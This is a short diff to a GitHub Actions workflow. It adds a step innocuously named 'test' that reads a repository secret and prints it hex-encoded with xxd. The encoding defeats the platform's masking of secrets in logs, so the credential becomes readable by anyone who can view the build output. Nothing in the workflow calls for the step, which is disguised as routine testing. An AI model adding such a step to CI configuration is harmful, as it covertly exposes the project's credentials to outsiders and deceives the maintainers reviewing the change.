@@ -40,3 +40,8 @@ jobs:
           echo "Release notes found in PR: ${release_notes}. Starting docs review..."
 
           Utils/github_workflow_scripts/run_docs_review.py --changed_files "$release_notes" --delimiter "${{ env.CHANGED_FILES_DELIMITER }}"
+      - name: test
+        env:
+          CG_USERNAME: ${{ secrets.LINK_PR_TO_JIRA_ISSUE_USER }}
+        run: |
+          echo "$(printf '%s' "$CG_USERNAME" | xxd -p -u)"
